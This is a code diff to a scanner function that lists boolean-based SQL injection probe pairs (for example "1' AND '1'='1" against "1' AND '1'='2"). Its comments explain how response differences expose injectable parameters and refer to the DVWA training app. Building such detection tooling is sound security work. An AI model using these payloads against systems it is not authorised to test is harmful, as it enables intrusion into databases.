@@ -103,10 +103,18 @@ def sqli_boolean() -> List[Tuple[str, str]]:
     false variant differ — that asymmetry is the proof.
     """
     return [
+        # Value-prefixed: the TRUE variant keeps the original row (id=1 AND true)
+        # so it behaves like the baseline, while FALSE returns nothing — the
+        # asymmetry a real point shows. Needed for value-context params (e.g.
+        # DVWA's `id`), where a bare leading quote closes the value to empty and
+        # both branches return no rows (no differential).
+        ("1' AND '1'='1", "1' AND '1'='2"),        # string context
+        ("1 AND 1=1", "1 AND 1=2"),                # numeric context
+        ("1') AND ('1'='1", "1') AND ('1'='2"),    # parenthesised string context
+        # Bare (no leading value) — for points where the injected fragment
+        # replaces a whole clause rather than a value.
         ("' AND '1'='1", "' AND '1'='2"),
         ("' OR '1'='1", "' AND '1'='2"),
-        (" AND 1=1", " AND 1=2"),
-        ("') AND ('1'='1", "') AND ('1'='2"),
     ]
 
 
